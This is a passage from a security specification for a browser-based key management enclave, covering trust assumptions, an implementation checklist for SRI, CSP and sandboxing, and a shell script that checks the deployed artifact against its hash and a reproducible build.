- Defense: Keep OS updated, use antivirus, avoid malware

### Trust Assumptions

**Must trust:**
1. Browser vendor (Chrome/Firefox/Safari)
2. Browser WebCrypto implementation
3. Browser SRI verification
4. Browser CSP enforcement
5. Browser same-origin policy
6. Operating system (to some extent)
7. Hardware (CPU, memory, storage)

**Do NOT need to trust:**
1. ATS developers (code is verifiable)
2. CDN (SRI catches tampering)
3. Build server (reproducible builds)
4. GitHub Actions (can verify independently)
5. Network (HTTPS + SRI)

---

## Implementation Checklist

### Phase 1: Minimal HTML Bootstrap

- [ ] Create `build/generate-kms-html.ts`
- [ ] Generate kms.html with SRI hash
- [ ] Verify kms.html is exactly 5 lines
- [ ] Test SRI verification (inject wrong hash, verify failure)
- [ ] Add CI step to generate kms.html on every build

### Phase 2: CSP Headers

- [ ] Add CSP meta tag to kms.html
- [ ] Configure CDN to send CSP HTTP headers
- [ ] Test CSP blocks external scripts
- [ ] Test CSP blocks inline scripts
- [ ] Test CSP blocks external fetch

### Phase 3: Sandbox Configuration

- [ ] Create iframe with `sandbox="allow-scripts allow-same-origin"`
- [ ] Test cross-origin isolation (cannot access PWA cookies)
- [ ] Test same-origin requests work (badge.json, self-verification)
- [ ] Document security rationale for `allow-same-origin`

### Phase 4: Runtime Self-Check

- [ ] Implement `verifyDeployment()` function
- [ ] Fetch badge.json on startup
- [ ] Verify Sigstore signature
- [ ] Check quorum (2/3 sources)
- [ ] Render fail-secure UI if verification fails
- [ ] Test fail-secure mode (inject bad badge)

### Phase 5: Integration Testing

- [ ] E2E test: PWA loads KMS iframe
- [ ] E2E test: SRI verification passes
- [ ] E2E test: SRI verification fails (wrong hash)
- [ ] E2E test: Runtime verification passes
- [ ] E2E test: Runtime verification fails (bad badge)
- [ ] E2E test: postMessage RPC works
- [ ] E2E test: Cross-origin isolation enforced

### Phase 6: Documentation

- [ ] User guide: How to verify kms.html
- [ ] User guide: What to do if SRI fails
- [ ] Developer guide: How to update kms.html
- [ ] Security docs: Isolation architecture
- [ ] Runbook: Incident response for verification failures

---

## Related Documentation

- [Self-Attestation](../../self-attestation/README.md) - Continuous verification system
- [Fail-Secure Verification](../../self-attestation/fail-secure-verification.md) - Runtime integrity checking
- [Module Architecture](../module-architecture.md) - Component separation (kms-user, client, worker)
- [Security Improvements](../security-improvements.md) - V2 security enhancements

---

## Example: Complete Deployment

### File Structure

```
kms.ats.run/
├── kms.html (5 lines, generated by CI)
├── kms-v2.0.0-7f8a9b0c.mjs (bundled ESM, content-addressed)
├── worker.js (dedicated worker, bundled)
├── badge.json (signed verification result)
├── badge.json.bundle (Sigstore proof)
└── .well-known/
    └── security.txt (security contact, GPG key)
```

### kms.html (actual file)

```html
<!doctype html>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; connect-src 'self'; worker-src 'self'; style-src 'none'; img-src 'none'; font-src 'none'; object-src 'none'; media-src 'none'; frame-src 'none'; child-src 'none'; form-action 'none'; frame-ancestors https://allthe.services; base-uri 'none'; manifest-src 'none'">
<title>ATS KMS Enclave</title>
<script type="module" integrity="sha256-f4OxZX/x/FO5LcGBSKHWXfwtSxCeq6d2kqbUqZ5K6fU=" src="/kms-v2.0.0-7f8a9b0c.mjs"></script>
```

### Verification by Security Researcher

```bash
# 1. View kms.html source
curl https://kms.ats.run/kms.html

# 2. Verify it's minimal (5 lines)
curl -s https://kms.ats.run/kms.html | wc -l
# Output: 5

# 3. Extract SRI hash
SRI=$(curl -s https://kms.ats.run/kms.html | grep -oP 'integrity="\K[^"]+')
echo "SRI from HTML: $SRI"
# Output: sha256-f4OxZX/x/FO5LcGBSKHWXfwtSxCeq6d2kqbUqZ5K6fU=

# 4. Download artifact
curl -sO https://kms.ats.run/kms-v2.0.0-7f8a9b0c.mjs

# 5. Compute SRI locally
LOCAL_SRI="sha256-$(openssl dgst -sha256 -binary kms-v2.0.0-7f8a9b0c.mjs | openssl base64 -A)"
echo "SRI computed: $LOCAL_SRI"

# 6. Compare
if [ "$SRI" = "$LOCAL_SRI" ]; then
  echo "✅ SRI matches - artifact verified"
else
  echo "❌ SRI mismatch - SECURITY INCIDENT"
fi

# 7. Rebuild from source and compare
git clone https://github.com/Lukium/ats-kms-enclave.git
cd ats-kms-enclave
git checkout v2.0.0
pnpm install --frozen-lockfile
pnpm build:reproducible

# 8. Compare built artifact with live
diff dist/kms-v2.0.0-*.mjs ../kms-v2.0.0-7f8a9b0c.mjs
# Output: (empty = identical)

echo "✅ Reproducible build verified - deployed artifact matches source"
```

---

**End of Iframe Isolation & Verifiable Enclave Specification**
